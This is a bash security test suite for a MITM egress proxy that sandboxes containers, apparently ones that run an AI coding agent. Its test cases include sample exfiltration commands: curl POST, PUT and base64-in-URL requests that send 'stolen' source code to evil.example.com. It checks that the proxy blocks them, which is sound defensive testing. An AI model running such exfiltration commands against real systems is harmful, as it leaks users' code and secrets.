#!/bin/bash
# network-proxy-test.sh — Security validation for the MITM network proxy
#
# Runs from the HOST, spawns disposable containers that route through the proxy.
# Requires: proxy container running (ysa-proxy), image built (sandbox-claude).
#
# Usage: ./network-proxy-test.sh

set -uo pipefail

PASS=0
FAIL=0
SKIP=0
TESTS=0
IMAGE="sandbox-claude"
PROXY="http://host.containers.internal:3128"
SERVER_PORT="${SERVER_PORT:-4000}"

# ── Helpers ──────────────────────────────────────────────────────────────

check() {
  TESTS=$((TESTS + 1))
  local desc="$1"
  local expect="$2"  # "allow" or "block"
  local cmd="$3"

  echo -n "  [$TESTS] $desc ... "
  output=$(podman run --rm \
    --network slirp4netns \
    -e HTTP_PROXY="$PROXY" \
    -e http_proxy="$PROXY" \
    -e HTTPS_PROXY="$PROXY" \
    -e https_proxy="$PROXY" \
    "$IMAGE" -c "$cmd" 2>&1)
  exit_code=$?

  if [ "$expect" = "block" ]; then
    if echo "$output" | grep -qi "Blocked by network policy\|403"; then
      echo "PASS (blocked)"
      PASS=$((PASS + 1))
    elif [ $exit_code -ne 0 ]; then
      echo "PASS (blocked — exit $exit_code)"
      PASS=$((PASS + 1))
    else
      echo "FAIL (should have been blocked)"
      echo "       Output: $(echo "$output" | head -3)"
      FAIL=$((FAIL + 1))
    fi
  else
    if [ $exit_code -eq 0 ] && ! echo "$output" | grep -qi "Blocked by network policy"; then
      echo "PASS (allowed)"
      PASS=$((PASS + 1))
    else
      echo "FAIL (should have been allowed)"
      echo "       Output: $(echo "$output" | head -3)"
      FAIL=$((FAIL + 1))
    fi
  fi
}

check_output() {
  TESTS=$((TESTS + 1))
  local desc="$1"
  local expect_pattern="$2"
  local cmd="$3"

  echo -n "  [$TESTS] $desc ... "
  output=$(podman run --rm \
    --network slirp4netns \
    -e HTTP_PROXY="$PROXY" \
    -e http_proxy="$PROXY" \
    -e HTTPS_PROXY="$PROXY" \
    -e https_proxy="$PROXY" \
    "$IMAGE" -c "$cmd" 2>&1)

  if echo "$output" | grep -qE "$expect_pattern"; then
    echo "PASS"
    PASS=$((PASS + 1))
  else
    echo "FAIL (expected pattern: $expect_pattern)"
    echo "       Output: $(echo "$output" | head -3)"
    FAIL=$((FAIL + 1))
  fi
}

# ── Preflight ────────────────────────────────────────────────────────────

echo "=========================================="
echo " NETWORK PROXY SECURITY TEST"
echo "=========================================="
echo ""

# Verify proxy is running
if ! podman ps --format '{{.Names}}' 2>/dev/null | grep -q ysa-proxy; then
  echo "ERROR: ysa-proxy container is not running."
  echo "Start it with: bun run src/runtime/proxy.ts → startProxy()"
  exit 1
fi

echo "Proxy container: running"
echo "Image: $IMAGE"
echo "Server port: $SERVER_PORT"

# Verify proxy has the correct server port bypass
PROXY_ENV=$(podman inspect ysa-proxy --format '{{range .Config.Env}}{{println .}}{{end}}' 2>/dev/null)
if ! echo "$PROXY_ENV" | grep -q "host\.containers\.internal:${SERVER_PORT}"; then
  echo "WARNING: Proxy does not have host.containers.internal:${SERVER_PORT} in PROXY_BYPASS_HOSTS."
  echo "  Bypass port tests will reflect that. Start proxy via ensureProxy() with the correct serverPort."
fi
echo ""

# ─── 1. HTTP Method Filtering ────────────────────────────────────────────
echo "--- 1. HTTP Method Filtering ---"
check "HTTP GET allowed" \
  "allow" \
  'curl -s -o /dev/null -w "%{http_code}" -x '"$PROXY"' http://example.com'

check "HTTP POST blocked" \
  "block" \
  'curl -sf -x '"$PROXY"' -X POST http://example.com'

check "HTTP PUT blocked" \
  "block" \
  'curl -sf -x '"$PROXY"' -X PUT http://example.com'

check "HTTP DELETE blocked" \
  "block" \
  'curl -sf -x '"$PROXY"' -X DELETE http://example.com'

check "HTTP PATCH blocked" \
  "block" \
  'curl -sf -x '"$PROXY"' -X PATCH http://example.com'

check "HTTP OPTIONS blocked" \
  "block" \
  'curl -sf -x '"$PROXY"' -X OPTIONS http://example.com'

echo ""

# ─── 2. HTTP Body Exfiltration ───────────────────────────────────────────
echo "--- 2. HTTP Body Exfiltration ---"
check "POST with body blocked" \
  "block" \
  'curl -sf -x '"$PROXY"' -X POST -d "secret_data=exfiltrated" http://example.com'

check "POST with JSON body blocked" \
  "block" \
  'curl -sf -x '"$PROXY"' -X POST -H "Content-Type: application/json" -d "{\"secret\":\"data\"}" http://example.com'

check "POST multipart upload blocked" \
  "block" \
  'echo "secret" > /tmp/exfil.txt && curl -sf -x '"$PROXY"' -X POST -F "file=@/tmp/exfil.txt" http://example.com'

echo ""

# ─── 3. HTTPS MITM Inspection ───────────────────────────────────────────
echo "--- 3. HTTPS MITM Inspection ---"
check_output "HTTPS GET allowed (MITM decrypted + inspected)" \
  "^2[0-9][0-9]$" \
  'curl -s -o /dev/null -w "%{http_code}" -x '"$PROXY"' https://github.com'

check "HTTPS POST blocked (MITM decrypted + inspected)" \
  "block" \
  'curl -sf -x '"$PROXY"' -X POST https://example.com'

check "HTTPS PUT blocked" \
  "block" \
  'curl -sf -x '"$PROXY"' -X PUT https://example.com'

check "HTTPS DELETE blocked" \
  "block" \
  'curl -sf -x '"$PROXY"' -X DELETE https://example.com'

check "HTTPS POST with body blocked" \
  "block" \
  'curl -sf -x '"$PROXY"' -X POST -d "secret" https://example.com'

echo ""

# ─── 4. URL Length Limits ────────────────────────────────────────────────
echo "--- 4. URL Length Limits ---"
# Path with mixed chars that won't trigger base64 detection: /seg-1/seg-2/... pattern
check "URL at ~195 chars allowed" \
  "allow" \
  'curl -s -o /dev/null -w "%{http_code}" -x '"$PROXY"' "http://example.com/api/v1/seg-a/seg-b/seg-c/seg-d/seg-e/seg-f/seg-g/seg-h/seg-i/seg-j/seg-k/seg-l/seg-m/seg-n/seg-o/seg-p/seg-q/seg-r/seg-s/seg-t/seg-u/seg-v"'

check "URL >200 chars blocked" \
  "block" \
  'curl -sf -x '"$PROXY"' "http://example.com/$(printf "a%.0s" $(seq 1 201))"'

check "Long HTTPS URL blocked" \
  "block" \
  'curl -sf -x '"$PROXY"' "https://example.com/$(printf "b%.0s" $(seq 1 201))"'

echo ""

# ─── 5. Encoded Data Detection (URL Paths) ──────────────────────────────
echo "--- 5. Encoded Data Detection (URL Paths) ---"

# Base64 patterns — data exfiltration via URL path segments
check "Base64 in URL path blocked (short payload)" \
  "block" \
  'curl -sf -x '"$PROXY"' http://example.com/aGVsbG8gd29ybGQgdGhpcyBpcyBhIHNlY3JldA=='

check "Base64 in URL path blocked (long payload)" \
  "block" \
  'curl -sf -x '"$PROXY"' http://example.com/dGhpcyBpcyBhIHZlcnkgbG9uZyBzZWNyZXQgbWVzc2FnZSB0aGF0IHNob3VsZCBiZSBibG9ja2Vk'

# Hex-encoded data
check "Hex-encoded data in path blocked" \
  "block" \
  'curl -sf -x '"$PROXY"' http://example.com/48656c6c6f20576f726c642054686973204973205365637265744461746148657265'

# URL-safe base64 variant (+ replaced with -)
check "URL-safe base64 variant blocked" \
  "block" \
  'curl -sf -x '"$PROXY"' http://example.com/aGVsbG8td29ybGQtdGhpcy1pcy1zZWNyZXQ'

# Nested path segments with encoding
check "Multi-segment encoded path blocked" \
  "block" \
  'curl -sf -x '"$PROXY"' http://example.com/data/aGVsbG8gd29ybGQgdGhpcyBpcyBhIHNlY3JldA=='

# HTTPS variant
check "Base64 in HTTPS path blocked" \
  "block" \
  'curl -sf -x '"$PROXY"' https://example.com/aGVsbG8gd29ybGQgdGhpcyBpcyBhIHNlY3JldA=='

echo ""

# ─── 6. Legitimate URLs (False Positive Check) ──────────────────────────
echo "--- 6. Legitimate URLs (false positive check) ---"
# These use -s (not -sf) because example.com returns 404 for non-existent paths.
# The test verifies the proxy ALLOWED the request (any non-403 status = pass).
check_output "Normal API path allowed (proxy does not block)" \
  "^[245][0-9][0-9]$" \
  'curl -s -o /dev/null -w "%{http_code}" -x '"$PROXY"' http://example.com/api/v2/users/profile'

check_output "Short query params allowed" \
  "^[245][0-9][0-9]$" \
  'curl -s -o /dev/null -w "%{http_code}" -x '"$PROXY"' "http://example.com?page=1&sort=name"'

check_output "UUID in path allowed (not flagged as encoding)" \
  "^[245][0-9][0-9]$" \
  'curl -s -o /dev/null -w "%{http_code}" -x '"$PROXY"' http://example.com/api/users/a1b2c3d4'

check_output "Normal doc path allowed" \
  "^[245][0-9][0-9]$" \
  'curl -s -o /dev/null -w "%{http_code}" -x '"$PROXY"' http://example.com/docs/getting-started'

check_output "NPM package path allowed" \
  "^[245][0-9][0-9]$" \
  'curl -s -o /dev/null -w "%{http_code}" -x '"$PROXY"' http://example.com/@scope/package-name'

echo ""

# ─── 7. Header Size Limits ──────────────────────────────────────────────
echo "--- 7. Header Size Limits ---"
check "Normal headers allowed" \
  "allow" \
  'curl -s -o /dev/null -w "%{http_code}" -x '"$PROXY"' -H "Accept: text/html" http://example.com'

# Use Cookie (a standard header the proxy keeps) to exceed 4KB total
check "Oversized standard headers blocked (>4KB)" \
  "block" \
  'curl -sf -x '"$PROXY"' -H "Cookie: $(printf "A%.0s" $(seq 1 5000))" http://example.com'

echo ""

# ─── 8. Burst Detection ─────────────────────────────────────────────────
echo "--- 8. Burst Detection (>10 req in 5s window) ---"
# Need a clean domain for this — use httpbin.org to avoid counter bleed
check_output "11 rapid requests — last one blocked" \
  "403" \
  'for i in $(seq 1 11); do curl -s -o /dev/null -w "%{http_code}\n" -x '"$PROXY"' http://httpbin.org/get; done | tail -1'

echo ""

# ─── 9. Rate Limit (>30 req/min per domain) ─────────────────────────────
echo "--- 9. Rate Limit (>30 req/min per domain) ---"
# This uses a fresh domain to avoid interference from burst test
# We'll send 31 requests (burst window resets after first 10-ish, then rate limit kicks in at 30)
check_output "31 requests — rate limited" \
  "403" \
  'for i in $(seq 1 31); do curl -s -o /dev/null -w "%{http_code}\n" -x '"$PROXY"' http://ifconfig.me/; done | tail -1'

echo ""

# ─── 10. Data Exfiltration via DNS (no proxy bypass) ────────────────────
echo "--- 10. Exfiltration Vectors ---"
check "Cannot POST to attacker-controlled domain" \
  "block" \
  'curl -sf -x '"$PROXY"' -X POST -d "stolen_code" http://evil.example.com/receive'

check "Cannot PUT file contents" \
  "block" \
  'curl -sf -x '"$PROXY"' -X PUT -d "source_code_here" http://evil.example.com/upload'

check "Cannot exfiltrate via long URL path (encoded)" \
  "block" \
  'curl -sf -x '"$PROXY"' "http://evil.example.com/$(echo "this is secret source code from the repo" | base64 | tr -d "\n")"'

echo ""

# ─── 11. Bypass Hosts ───────────────────────────────────────────────────
echo "--- 11. Bypass Hosts (port-restricted) ---"
# host.containers.internal is port-restricted: only SERVER_PORT is bypassed (all methods allowed)
# Any other port goes through strict policy (POST blocked, GET inspected)
check "Correct port on host.containers.internal: GET allowed (bypassed)" \
  "allow" \
  'curl -sf -o /dev/null -w "%{http_code}" -x '"$PROXY"' http://host.containers.internal:'"$SERVER_PORT"'/ 2>/dev/null; true'

check "Correct port on host.containers.internal: POST allowed (bypassed)" \
  "allow" \
  'curl -sf -o /dev/null -w "%{http_code}" -x '"$PROXY"' -X POST -d "data" http://host.containers.internal:'"$SERVER_PORT"'/ 2>/dev/null; true'

check "Wrong port on host.containers.internal: POST blocked (not bypassed)" \
  "block" \
  'curl -sf -x '"$PROXY"' -X POST -d "data" http://host.containers.internal:9999/'

check "Datadog telemetry endpoint blocked" \
  "block" \
  'curl -sf -x '"$PROXY"' http://http-intake.logs.us5.datadoghq.com/v1/input'

echo ""

# ─── 12. Non-standard Headers Stripped ───────────────────────────────────
echo "--- 12. Non-standard Header Stripping ---"
# The proxy strips non-standard headers before forwarding.
# We verify indirectly: a request with only custom headers shouldn't break.
check "Request with custom headers passes (stripped, not blocked)" \
  "allow" \
  'curl -s -o /dev/null -w "%{http_code}" -x '"$PROXY"' -H "X-Custom: evil" -H "X-Exfil: data" http://example.com'

echo ""

# ─── 13. Protocol Edge Cases ────────────────────────────────────────────
echo "--- 13. Protocol Edge Cases ---"
check "HTTP/1.0 request works" \
  "allow" \
  'curl -s -o /dev/null -w "%{http_code}" --http1.0 -x '"$PROXY"' http://example.com'

check "HEAD request blocked (not in allowed methods)" \
  "block" \
  'curl -sf -x '"$PROXY"' -I http://example.com'

echo ""

# ─── 14. HTTPS Certificate Verification ─────────────────────────────────
echo "--- 14. HTTPS Certificate Trust ---"
# Container trusts the baked-in CA — MITM certs are valid inside sandbox
check_output "HTTPS succeeds without --insecure (CA trusted)" \
  "^2[0-9][0-9]$" \
  'curl -s -o /dev/null -w "%{http_code}" -x '"$PROXY"' https://github.com'

# Verify the CA cert exists in the trust store
check_output "CA cert installed in trust store" \
  "ysa" \
  'ls /usr/local/share/ca-certificates/ 2>/dev/null'

echo ""

# ─── 15. Proxy Container Hardening ──────────────────────────────────────
echo "--- 15. Proxy Container Hardening ---"
# Podman reports --cap-drop ALL as individual cap names; check effective caps are empty
echo -n "  [$((TESTS + 1))] Proxy has no effective capabilities ... "
TESTS=$((TESTS + 1))
eff_caps=$(podman inspect ysa-proxy --format '{{.EffectiveCapabilities}}' 2>/dev/null)
if [ "$eff_caps" = "[]" ] || [ -z "$eff_caps" ]; then
  echo "PASS"
  PASS=$((PASS + 1))
else
  echo "FAIL (EffectiveCaps: $eff_caps)"
  FAIL=$((FAIL + 1))
fi

echo -n "  [$((TESTS + 1))] Proxy has no-new-privileges ... "
TESTS=$((TESTS + 1))
secopt=$(podman inspect ysa-proxy --format '{{.HostConfig.SecurityOpt}}' 2>/dev/null)
if echo "$secopt" | grep -q "no-new-privileges"; then
  echo "PASS"
  PASS=$((PASS + 1))
else
  echo "FAIL (SecurityOpt: $secopt)"
  FAIL=$((FAIL + 1))
fi

echo -n "  [$((TESTS + 1))] Proxy filesystem is read-only ... "
TESTS=$((TESTS + 1))
ro=$(podman inspect ysa-proxy --format '{{.HostConfig.ReadonlyRootfs}}' 2>/dev/null)
if [ "$ro" = "true" ]; then
  echo "PASS"
  PASS=$((PASS + 1))
else
  echo "FAIL (ReadonlyRootfs: $ro)"
  FAIL=$((FAIL + 1))
fi

echo -n "  [$((TESTS + 1))] Proxy has memory limit ... "
TESTS=$((TESTS + 1))
mem=$(podman inspect ysa-proxy --format '{{.HostConfig.Memory}}' 2>/dev/null)
if [ -n "$mem" ] && [ "$mem" != "0" ]; then
  echo "PASS ($(( mem / 1024 / 1024 ))MB)"
  PASS=$((PASS + 1))
else
  echo "FAIL (Memory: $mem)"
  FAIL=$((FAIL + 1))
fi

echo -n "  [$((TESTS + 1))] Proxy has PID limit ... "
TESTS=$((TESTS + 1))
pids=$(podman inspect ysa-proxy --format '{{.HostConfig.PidsLimit}}' 2>/dev/null)
if [ -n "$pids" ] && [ "$pids" != "0" ]; then
  echo "PASS ($pids)"
  PASS=$((PASS + 1))
else
  echo "FAIL (PidsLimit: $pids)"
  FAIL=$((FAIL + 1))
fi

echo -n "  [$((TESTS + 1))] Proxy uses seccomp profile ... "
TESTS=$((TESTS + 1))
if echo "$secopt" | grep -q "seccomp"; then
  echo "PASS"
  PASS=$((PASS + 1))
else
  echo "FAIL"
  FAIL=$((FAIL + 1))
fi

echo ""

# ─── 16. Proxy Logging ──────────────────────────────────────────────────
echo "--- 16. Proxy Audit Logging ---"
PROXY_LOGS=$(podman logs ysa-proxy 2>&1)

echo -n "  [$((TESTS + 1))] Proxy logs contain ALLOW entries ... "
TESTS=$((TESTS + 1))
if echo "$PROXY_LOGS" | grep -qF '[ALLOW]'; then
  echo "PASS"
  PASS=$((PASS + 1))
else
  echo "FAIL"
  FAIL=$((FAIL + 1))
fi

echo -n "  [$((TESTS + 1))] Proxy logs contain BLOCK entries ... "
TESTS=$((TESTS + 1))
if echo "$PROXY_LOGS" | grep -qF '[BLOCK]'; then
  echo "PASS"
  PASS=$((PASS + 1))
else
  echo "FAIL"
  FAIL=$((FAIL + 1))
fi

echo -n "  [$((TESTS + 1))] Proxy logs include reason for blocks ... "
TESTS=$((TESTS + 1))
if echo "$PROXY_LOGS" | grep -F '[BLOCK]' | grep -qE "method_blocked|url_too_long|base64_pattern|hex_pattern|high_entropy|burst|rate_limit|body_blocked|headers_too_large"; then
  echo "PASS"
  PASS=$((PASS + 1))
else
  echo "FAIL"
  FAIL=$((FAIL + 1))
fi

echo ""

# ═══════════════════════════════════════════════════════════════════════
# OCI HOOK — L3/L4 iptables enforcement
# ═══════════════════════════════════════════════════════════════════════

echo ""

# Check if OCI hook is installed in the Podman VM
HOOK_INSTALLED=true
if ! podman machine ssh -- 'test -x /opt/proxy/oci-network-hook.sh && test -f /etc/containers/oci/hooks.d/network-policy.json' 2>/dev/null; then
  HOOK_INSTALLED=false
fi

if [ "$HOOK_INSTALLED" = "true" ]; then

echo "--- 17. OCI Hook — iptables Enforcement ---"

# Container with annotation: direct internet blocked
echo -n "  [$((TESTS + 1))] Direct internet blocked (iptables DROP) ... "
TESTS=$((TESTS + 1))
code=$(podman run --rm --network slirp4netns \
  --annotation network_policy=strict \
  "$IMAGE" -c 'curl -s --connect-timeout 5 -o /dev/null -w "%{http_code}" http://example.com' 2>&1)
if [ "$code" = "000" ]; then
  echo "PASS (blocked)"
  PASS=$((PASS + 1))
else
  echo "FAIL (got HTTP $code, expected 000)"
  FAIL=$((FAIL + 1))
fi

# Container with annotation: proxy port reachable
echo -n "  [$((TESTS + 1))] Via proxy with iptables (GET allowed) ... "
TESTS=$((TESTS + 1))
code=$(podman run --rm --network slirp4netns \
  --annotation network_policy=strict \
  -e HTTP_PROXY="$PROXY" \
  -e http_proxy="$PROXY" \
  "$IMAGE" -c 'curl -s --connect-timeout 5 -o /dev/null -w "%{http_code}" -x http://host.containers.internal:3128 http://example.com' 2>&1)
if [ "$code" = "200" ]; then
  echo "PASS (allowed)"
  PASS=$((PASS + 1))
else
  echo "FAIL (got HTTP $code, expected 200)"
  FAIL=$((FAIL + 1))
fi

# POST via proxy blocked by L7
echo -n "  [$((TESTS + 1))] POST via proxy blocked by L7 (iptables + proxy) ... "
TESTS=$((TESTS + 1))
output=$(podman run --rm --network slirp4netns \
  --annotation network_policy=strict \
  -e HTTP_PROXY="$PROXY" \
  -e http_proxy="$PROXY" \
  "$IMAGE" -c 'curl -s --connect-timeout 5 -x http://host.containers.internal:3128 -X POST http://example.com' 2>&1)
if echo "$output" | grep -q "method_blocked"; then
  echo "PASS (blocked)"
  PASS=$((PASS + 1))
else
  echo "FAIL (output: ${output:0:100})"
  FAIL=$((FAIL + 1))
fi

# Direct IP bypass blocked
echo -n "  [$((TESTS + 1))] Direct IP bypass blocked (iptables) ... "
TESTS=$((TESTS + 1))
code=$(podman run --rm --network slirp4netns \
  --annotation network_policy=strict \
  "$IMAGE" -c 'curl -s --connect-timeout 5 -o /dev/null -w "%{http_code}" http://93.184.215.14' 2>&1)
if [ "$code" = "000" ]; then
  echo "PASS (blocked)"
  PASS=$((PASS + 1))
else
  echo "FAIL (got HTTP $code, expected 000)"
  FAIL=$((FAIL + 1))
fi

# Server port allowed
# exit 0 = HTTP response, exit 7 = TCP refused (port reachable, no server) — both mean iptables allowed it
# exit 28 = timeout — iptables dropped it
echo -n "  [$((TESTS + 1))] Server port ($SERVER_PORT) allowed by iptables ... "
TESTS=$((TESTS + 1))
curl_exit=$(podman run --rm --network slirp4netns \
  --annotation network_policy=strict \
  "$IMAGE" -c "curl -s --connect-timeout 5 -o /dev/null http://host.containers.internal:${SERVER_PORT}/; echo \$?" 2>&1 | tail -1)
if [ "$curl_exit" = "0" ] || [ "$curl_exit" = "7" ]; then
  echo "PASS (port reachable, curl exit $curl_exit)"
  PASS=$((PASS + 1))
else
  echo "FAIL (port blocked — curl exit $curl_exit)"
  FAIL=$((FAIL + 1))
fi

# Random port blocked
echo -n "  [$((TESTS + 1))] Random port (8080) blocked by iptables ... "
TESTS=$((TESTS + 1))
code=$(podman run --rm --network slirp4netns \
  --annotation network_policy=strict \
  "$IMAGE" -c 'curl -s --connect-timeout 5 -o /dev/null -w "%{http_code}" http://host.containers.internal:8080' 2>&1)
if [ "$code" = "000" ]; then
  echo "PASS (blocked)"
  PASS=$((PASS + 1))
else
  echo "FAIL (got HTTP $code, expected 000)"
  FAIL=$((FAIL + 1))
fi

# HTTPS via proxy with iptables
echo -n "  [$((TESTS + 1))] HTTPS via proxy with iptables ... "
TESTS=$((TESTS + 1))
code=$(podman run --rm --network slirp4netns \
  --annotation network_policy=strict \
  -e HTTPS_PROXY="$PROXY" \
  -e https_proxy="$PROXY" \
  "$IMAGE" -c 'curl -s --connect-timeout 10 -o /dev/null -w "%{http_code}" -x http://host.containers.internal:3128 https://httpbin.org/get' 2>&1)
if [ "$code" = "200" ]; then
  echo "PASS (allowed)"
  PASS=$((PASS + 1))
else
  echo "FAIL (got HTTP $code, expected 200)"
  FAIL=$((FAIL + 1))
fi

# Control: no annotation = full internet
echo -n "  [$((TESTS + 1))] No annotation = full internet (control) ... "
TESTS=$((TESTS + 1))
code=$(podman run --rm --network slirp4netns \
  "$IMAGE" -c 'curl -s --connect-timeout 5 -o /dev/null -w "%{http_code}" http://example.com' 2>&1)
if [ "$code" = "200" ]; then
  echo "PASS (allowed)"
  PASS=$((PASS + 1))
else
  echo "FAIL (got HTTP $code, expected 200)"
  FAIL=$((FAIL + 1))
fi

echo ""

echo "--- 18. OCI Hook — IPv6 Disabled ---"
echo -n "  [$((TESTS + 1))] IPv6 fully disabled ... "
TESTS=$((TESTS + 1))
code=$(podman run --rm --network slirp4netns \
  --annotation network_policy=strict \
  "$IMAGE" -c 'curl -s --connect-timeout 5 -o /dev/null -w "%{http_code}" -6 http://example.com 2>&1 || echo "000"' 2>&1)
if echo "$code" | grep -q "000"; then
  echo "PASS (blocked)"
  PASS=$((PASS + 1))
else
  echo "FAIL (got: $code)"
  FAIL=$((FAIL + 1))
fi

else
  echo "--- 17-18. OCI Hook Tests SKIPPED ---"
  echo "  OCI hook not installed in Podman VM."
  echo "  Run: container/setup-network-hooks.sh"
  SKIP=$((SKIP + 10))
fi

echo ""

# ═══════════════════════════════════════════════════════════════════════
echo "=========================================="
echo " RESULTS: $PASS passed, $FAIL failed, $SKIP skipped out of $TESTS tests"
echo "=========================================="

if [ $FAIL -gt 0 ]; then
  echo " *** NETWORK POLICY ISSUES FOUND ***"
  exit 1
else
  echo " All network proxy checks passed!"
  exit 0
fi
